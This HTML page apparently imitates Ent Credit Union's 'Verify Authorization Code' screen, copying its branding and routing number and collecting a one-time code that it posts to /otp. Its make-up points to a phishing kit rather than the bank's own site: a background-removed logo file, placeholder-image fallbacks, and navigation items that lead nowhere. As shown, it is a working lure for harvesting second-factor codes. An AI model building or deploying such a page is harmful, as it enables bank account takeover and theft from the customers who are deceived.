<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ent Credit Union: Verify Authorization Code</title>
    <link rel="stylesheet" href="bootstrap.css">
    <link rel="stylesheet" href="style.css">
    <link rel="icon" type="image/x-icon" href="image/2roLlGjkUQjHmwqW5nK9kJKd5vZ.svg" sizes="180x180">
</head>

<body>
    <nav class="d-lg-block d-none">
        <div class="lign-items-center">
            <div>
                <div class="nav1 d-flex gap-4 text-white justify-content-end pt-1">
                    <p class="text-decoration-underline d-flex gap-1">
                        <img src="image/fluent--location-48-filled.svg" width="18" alt="Location"> Locations
                    </p>
                    <p class="text-decoration-underline d-flex gap-1">
                        <img src="image/uis--graph-bar.svg" width="15" alt="Rates"> Rates
                    </p>
                    <p class="text-decoration-underline d-flex gap-1">
                        <img src="image/famicons--call.svg" width="18" alt="Contact"> Contact us
                    </p>
                    <p class="text-decoration-underline">Refer a friend</p>
                    <p>Routing #: 307070005</p>
                </div>
                <div class="d-flex" style="padding-left: 88px; padding-right: 88px; padding-top: 19px; padding-bottom: 19px;">
                    <div class="d-flex gap-5 align-items-center">
                        <div><img src="image/logo.svg" width="120" alt="Logo" onerror="this.src='https://via.placeholder.com/120'"></div>
                        <div>
                            <ul class="list-unstyled d-flex gap-5 ulstyle">
                                <li>Why Ent?</li>
                                <li>Products and services</li>
                                <li>Financial education</li>
                            </ul>
                        </div>
                    </div>
                    <div class="ps-4">
                        <input class="searchinput form-control shadow-none" type="search" placeholder="Search Ent.com"
                            onfocus="this.placeholder = ''" onblur="this.placeholder = 'Search Ent.com'">
                    </div>
                    <div class="ps-5 pt-2">
                        <button class="rounded-pill px-3 py-1 border-0 fw-medium but">Join today</button>
                    </div>
                </div>
            </div>
        </div>
    </nav>
    <nav class="d-block d-lg-none">
        <div class="d-flex justify-content-between gap-1 py-2 align-items-center pe-2">
            <div class="ps-2">
                <img src="image/ci--hamburger-md.svg" width="45" alt="Menu">
            </div>
            <div>
                <img src="image/logo.svg" width="100" alt="Logo" onerror="this.src='https://via.placeholder.com/100'">
            </div>
            <div>
                <p class="text-decoration-underline d-flex fs-5 fw-medium px-3 mx-auto pt-2 loginborder">
                    <img src="image/uis--padlock (1).svg" alt="Login"> Log in
                </p>
            </div>
        </div>
    </nav>
    <section>
        <form method="post" action="/otp">
            <div class="pt-5">
                <div class="mx-auto col-lg-6 col-md-10 col-12 bg-white card pt-3 rounded-2 pt-4">
                    <div class="text-center pb-3">
                        <img src="image/Ent_logo-removebg-preview.png" width="200" alt="Ent Logo" onerror="this.src='https://via.placeholder.com/200'">
                    </div>
                    <hr>
                    <div class="text-center">
                        <p>We have sent a verification code to your mobile number</p>
                    </div>
                    <div style="padding-left: 60px; padding-right: 60px;">
                        <div>
                            <label class="fw-medium" for="otp">Authorization Code</label>
                            <input name="code" class="form-control shadow-none" type="number" id="otp" required>
                            <span id="otpError" class="error-d"><small>Please fill out this field.</small></span>
                        </div>
                        <div class="pt-3 pb-5">
                            <button type="submit" class="rounded-2 w-100 fw-medium auth-continue">Continue</button>
                        </div>
                        <div>
                            <p class="fw-medium text-decoration-underline text-center pb-2">
                                Back to <a href="/">Login</a>
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </form>
    </section>
    <script src="otp.js"></script>
</body>
</html>
